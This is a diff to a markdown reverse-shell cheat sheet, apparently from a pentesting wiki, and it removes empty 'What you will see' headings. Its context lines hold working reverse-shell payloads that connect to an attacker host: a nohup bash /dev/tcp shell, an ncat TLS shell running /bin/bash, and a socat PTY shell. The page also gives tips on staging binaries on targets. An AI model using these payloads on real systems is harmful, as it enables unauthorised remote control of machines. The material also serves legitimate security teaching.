@@ -15,7 +15,7 @@ Raw channel:  terminal ↔ TCP ↔ terminal
 Shell:        terminal ↔ TCP ↔ shell process
 ```
 
-Without `-e`, `--exec`, or Socat's `EXEC:`, two Netcat endpoints still exchange text in both directions — but `whoami` is only text; nothing interprets it. This one distinction explains the single most common "my shell is broken" report, and section 2's **What you will see** turns on it.
+Without `-e`, `--exec`, or Socat's `EXEC:`, two Netcat endpoints still exchange text in both directions — but `whoami` is only text; nothing interprets it. This one distinction explains the single most common "my shell is broken" report.
 
 ### Reverse vs bind shell
 
@@ -113,8 +113,6 @@ bash -c 'nohup bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1 &'
 
 - `nohup` detaches from the parent, `&` backgrounds it — so the shell survives the web request or process that launched it exiting. This buys persistence of the *process*, not stability of the *session*.
 
-**What you will see** (this block covers every payload above)
-
 ## Catching the shell
 
 ### Listener
@@ -209,8 +207,6 @@ ncat --ssl ATTACKER_IP 4444 -e /bin/bash
 - both endpoints must be TLS → a plain `nc` client **cannot** complete the handshake with an `ncat --ssl` listener. The symptom is a connection that opens and instantly drops with a TLS error on the listener; it is not a broken shell, it is a plaintext client against a TLS server.
 - an Ncat TLS listener mints a throwaway certificate when none is given; `--ssl-verify --ssl-trustfile CERT.pem` when you actually need to authenticate the peer. Encryption hides content in transit only — not IPs, ports, timing, or process activity on the host.
 
-**What you will see** (Ncat, both variants)
-
 ## Socat — robust PTY and encrypted channels
 
 ### Plain TCP reverse shell
@@ -240,8 +236,6 @@ Target: `socat TCP:ATTACKER_IP:5555 EXEC:"bash -li",pty,stderr,sigint,setsid,san
 
 - `pty` allocates a pseudo-terminal on the target; `sigint` passes `Ctrl+C` through; `setsid` runs it in a new session; `sane` applies usable terminal defaults; ``FILE:`tty`,raw,echo=0`` attaches your side raw with no double echo. This pair gives a full interactive shell with **no** post-catch `stty` sequence — the reason to carry a Socat binary at all.
 - Socat absent on the target? Transfer a static build ([[File-Transfer]]) to `/tmp/socat`, `chmod +x`, and run it. Architecture and libc mismatches can make a transferred binary fail to execute — check `file` on it if it will not run.
-
-**What you will see** (Socat PTY pair)
 
 ## Shell Stabilisation — TTY Upgrade
 
